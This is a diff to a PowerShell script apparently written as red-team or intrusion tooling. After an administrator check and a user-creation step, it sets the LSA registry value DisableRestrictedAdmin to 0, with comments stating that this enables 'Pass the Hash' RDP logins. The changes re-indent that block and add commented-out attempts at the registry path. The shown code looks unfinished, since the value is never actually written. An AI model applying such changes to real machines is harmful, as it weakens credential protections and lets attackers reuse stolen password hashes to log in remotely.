@@ -32,17 +32,19 @@ if ($isAdmin) {
         } catch {
             Write-Host "Failed to create the user. Error: $_"
 
-        # Specifying registry key to allow "Pass the Hash" RDP techniques.
-          $KeyPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
-          $KeyName = "DisableRestrictedAdmin"
-          $Type = "REG_DWORD"
-          $Value = "0"
+            # Specifying registry key to allow "Pass the Hash" RDP techniques.
+              $KeyPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
+              #$KeyPath = HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
+              #Testing which $KeyPath works. Can probably just add the whole line if I try hard enough.
+              $KeyName = "DisableRestrictedAdmin"
+              $Type = "REG_DWORD"
+              $Value = "0"
 
-        # Creating the registry key to allow "Pass the Hash" RDP techniques
-          if (-not (Test-Path $KeyPath)) {
-          New-Item -Path $KeyPath -Force
-          Write-Host "Registry key '$KeyPath' created."
-    }
+            # Creating the registry key to allow "Pass the Hash" RDP techniques
+              if (-not (Test-Path $KeyPath)) {
+              New-Item -Path $KeyPath -Force
+              Write-Host "Registry key '$KeyPath' created."
+            }
         }    
 } else {
     Write-Host "You are NOT an administrator."
